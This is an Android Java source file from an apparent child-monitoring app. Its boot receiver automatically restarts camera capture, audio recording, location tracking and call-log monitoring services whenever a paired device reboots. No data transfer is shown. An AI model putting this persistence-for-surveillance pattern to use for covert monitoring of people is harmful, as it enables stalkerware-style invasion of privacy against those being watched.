package com.monitor.child.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

import com.monitor.child.utils.Constants;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            SharedPreferences prefs = context.getSharedPreferences("child_prefs", Context.MODE_PRIVATE);
            String pairedEmail = prefs.getString(Constants.PREF_PAIRED_EMAIL, null);
            if (pairedEmail != null) {
                context.startForegroundService(new Intent(context, CameraCaptureService.class));
                context.startForegroundService(new Intent(context, AudioRecordService.class));
                context.startForegroundService(new Intent(context, LocationService.class));
                context.startForegroundService(new Intent(context, CallLogMonitor.class));
            }
        }
    }
}
